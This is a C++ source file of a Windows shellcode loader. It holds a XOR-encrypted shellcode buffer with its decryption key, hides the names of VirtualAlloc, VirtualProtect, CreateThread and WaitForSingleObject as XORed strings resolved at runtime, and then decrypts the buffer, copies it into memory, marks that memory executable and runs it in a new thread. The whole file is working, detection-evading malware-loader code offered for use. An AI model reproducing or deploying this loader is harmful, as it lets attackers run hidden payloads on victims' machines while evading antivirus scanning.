#include "ProcXor.h"

// XORed shellcode
unsigned char buf[] = "\x9e\x2d\xed\x86\x99\x9a\xaf\x65\x76\x69\x3b\x30\x26\x31\x31\x38\x31\x58\xbf\x34\x00\x26\xe9\x3b\x12\x2b\xee\x24\x71\x32\xea\x35\x41\x2e\x58\xb0\x21\xe6\x10\x35\x26\x6d\xde\x38\x29\x2d\x47\xa9\xd6\x5d\x06\x1d\x61\x45\x59\x28\xac\xab\x68\x2f\x63\xa8\x90\x8e\x37\x37\x38\x32\xea\x35\x41\xe8\x2b\x45\x21\x6c\xb2\x03\xef\x1a\x71\x79\x61\x6a\xf3\x1b\x7a\x61\x67\xea\xe3\xe1\x79\x69\x6d\x2a\xe0\xae\x16\x0e\x3a\x62\xb5\x26\x2d\xf1\x21\x47\x28\x62\xb9\xf2\x21\x75\x81\x33\x23\x53\xa0\x3a\x9c\xac\x37\xe2\x4e\xe9\x2f\x60\xb5\x21\x48\xa9\x2c\xa3\xac\x63\xce\x28\x73\xa2\x5d\x96\x1c\x8b\x2d\x64\x2d\x47\x61\x3c\x50\xbc\x17\xbd\x36\x26\xe2\x32\x47\x2c\x77\xb9\x1c\x20\xec\x6d\x2b\x2d\xf2\x29\x71\x2b\x64\xbe\x23\xe2\x76\xeb\x2d\x77\xb9\x3b\x39\x26\x39\x3d\x30\x23\x28\x35\x23\x3c\x2f\x38\x21\xf1\x8f\x45\x37\x3b\x85\x81\x3f\x20\x3a\x33\x31\xe2\x7f\x8b\x2e\x91\x9d\x96\x2f\x2a\xdb\x01\x1a\x48\x3e\x54\x53\x63\x69\x38\x3f\x24\xeb\x83\x26\xe3\x85\xd2\x62\x65\x76\x20\xf3\x84\x2e\xdd\x61\x69\x5e\x66\x67\x62\x67\x61\x23\x3d\x3b\xea\x81\x3a\xe0\x8b\x20\xdd\x2d\x14\x4f\x7e\x96\xb8\x2e\xec\x84\x0a\x68\x73\x63\x65\x2f\x28\xc0\x48\xe7\x0a\x63\x96\xac\x03\x67\x23\x3b\x3e\x32\x24\x43\xaa\x28\x47\xa9\x32\x9e\xa7\x29\xea\xab\x31\x96\xad\x2a\xec\xaf\x23\xd3\x98\x6c\xba\x96\x96\xaf\x29\xee\xa6\x09\x79\x38\x31\x21\xeb\x87\x26\xeb\x90\x33\xd9\xfc\xd3\x1d\x1b\x9e\xb2\xe4\xa3\x1d\x73\x20\x92\xac\x10\x8b\x8a\xfa\x72\x63\x65\x3e\xea\x96\x71\x2f\xe8\x81\x24\x48\xa0\x07\x66\x24\x36\x2a\xe0\x8b\x22\xdf\x74\xb0\xb2\x3e\x98\xb4\xe0\x91\x79\x17\x38\x2a\xe6\xaa\x42\x37\xfb\x95\x0f\x36\x28\x23\x09\x67\x71\x63\x69\x38\x31\x25\xeb\x97\x26\x53\xa0\x33\xd9\x3d\xd2\x3a\x9f\x9e\xb2\x29\xea\xaa\x30\xe0\xaa\x2f\x54\xa7\x2b\xe0\x82\x2b\xec\xac\x21\xf3\x98\x26\xdb\x61\xb0\xb1\x36\x92\xb7\xe6\x96\x62\x14\x5a\x3b\x24\x21\x30\x12\x61\x27\x61\x63\x28\x21\x03\x6d\x38\x24\xd4\x69\x46\x7d\x53\x9a\xa3\x3e\x23\x20\xdd\x14\x0d\x24\x18\x96\xb8\x2b\x9a\xa0\x8b\x55\x8d\x9c\x9a\x3e\x68\xb9\x29\x4e\xa7\x2b\xec\x8f\x1c\xd9\x23\x9a\x89\x3a\x03\x72\x3a\x2c\xb1\xab\x8a\xd4\xc5\x37\x9c\xbc";

//XOR key
char x_key[] = "benbircevizagaciyim";

// XORed string that means "VirtualAlloc"
unsigned char vA[] = "\x34\x0c\x1c\x16\x1c\x13\x0f\x24\x1a\x05\x15\x02";

// XORed string that means "VirtualProtect"
unsigned char vP[] = "\x34\x0c\x1c\x16\x1c\x13\x0f\x35\x04\x06\x0e\x04\x04\x15";

// XORed string that means "CreateThread"
unsigned char cT[] = "\x21\x17\x0b\x03\x1d\x17\x37\x0d\x04\x0c\x1b\x05";

// XORed string that means "WaitForSingleObject"
unsigned char wFSO[] = "\x35\x04\x07\x16\x2f\x1d\x11\x36\x1f\x07\x1d\x0d\x02\x2e\x01\x03\x1c\x0a\x19";

// Declerating function pointers
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, __drv_aliasesMem LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* pWait)(HANDLE, DWORD);

int main() {

	// Xoring again the XORed shellcode to get real shellcode
	bixoring(buf, sizeof(buf), x_key, strlen(x_key), 0);
	DWORD threadID, oldPro;

	// Xoring again the XORed function names and converting into "char *"
	bixoring(vA, sizeof(vA), x_key, strlen(x_key), 1);
	bixoring(vP, sizeof(vP), x_key, strlen(x_key), 1);
	bixoring(cT, sizeof(cT), x_key, strlen(x_key), 1);
	bixoring(wFSO, sizeof(wFSO), x_key, strlen(x_key), 1);

	// Getting Handle for kernel32.dll and acquiring the functions from it
	HMODULE hkernel = GetModuleHandleA("kernel32.dll");
	pVirtualAlloc fakeVirtualAlloc = (pVirtualAlloc)GetProcAddress(hkernel, LPCSTR(vA));
	pVirtualProtect fakeVirtualProtect = (pVirtualProtect)GetProcAddress(hkernel, LPCSTR(vP));
	pCreateThread fakeCreateThread = (pCreateThread)GetProcAddress(hkernel, LPCSTR(cT));
	pWait fakeWait = (pWait)GetProcAddress(hkernel, LPCSTR(wFSO));

	// Classical process injection steps
	LPVOID shellcode_mem = fakeVirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlCopyMemory(shellcode_mem, buf, sizeof(buf));
	fakeVirtualProtect(shellcode_mem, sizeof(buf), PAGE_EXECUTE_READ, &oldPro);
	HANDLE thrd = fakeCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_mem, NULL, 0, &threadID);
	fakeWait(thrd, INFINITE);
}